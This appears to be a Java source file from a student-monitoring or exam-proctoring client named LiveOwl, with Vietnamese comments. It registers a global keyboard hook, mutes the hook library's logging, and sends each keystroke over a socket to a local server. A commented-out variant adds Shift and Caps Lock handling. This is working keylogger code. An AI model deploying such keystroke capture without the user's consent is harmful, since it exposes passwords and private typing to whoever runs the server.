package com.client.liveowl.KeyLogger;

import com.client.liveowl.util.UserHandler;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;

public class StudentClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;
    private static String CLIENT_ID = "Client_A";  // Đặt ID của client

    public static void main(String[] args) {
        // Tắt logging của JNativeHook
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        try {
            // Kết nối tới server
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter writer = new PrintWriter(outputStream, true);

            // Gửi ID của client cho server
         //   CLIENT_ID = UserHandler.getUserId();
            CLIENT_ID = UUID.randomUUID().toString().replace("-", "").substring(0, 8); // tạm để random
            System.out.println(CLIENT_ID);
            writer.println(CLIENT_ID);

            // Đăng ký bộ lắng nghe sự kiện bàn phím
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
                    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
                    writer.println(keyText); // Gửi phím bấm về server
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}



//private  boolean isShift = false;
//private boolean capsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // Lấy trạng thái CAPS LOCK ban đầu
//@Override
//public void nativeKeyPressed(NativeKeyEvent e) {
//    // Cập nhật trạng thái của phím SHIFT
//    if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
//        isShift = true;
//    }
//    // Cập nhật trạng thái của phím CAPS LOCK
//    if (e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
//        capsLockOn = !capsLockOn; // Đảo ngược trạng thái CAPS LOCK khi nhấn phím
//    }
//
//    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
//
//    // Kiểm tra và điều chỉnh theo trạng thái của SHIFT và CAPS LOCK
//    if (Character.isLetter(keyText.charAt(0))) {  // Chỉ xử lý ký tự chữ cái
//        if (isShift ^ capsLockOn) {  // XOR để xác định in hoa hay thường
//            keyText = keyText.toUpperCase();
//        } else {
//            keyText = keyText.toLowerCase();
//        }
//    }
//    writer.println(keyText);
//}
//
//@Override
//public void nativeKeyReleased(NativeKeyEvent e) {
//    // Cập nhật trạng thái khi nhả phím SHIFT
//    if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
//        isShift = false;
//    }
//}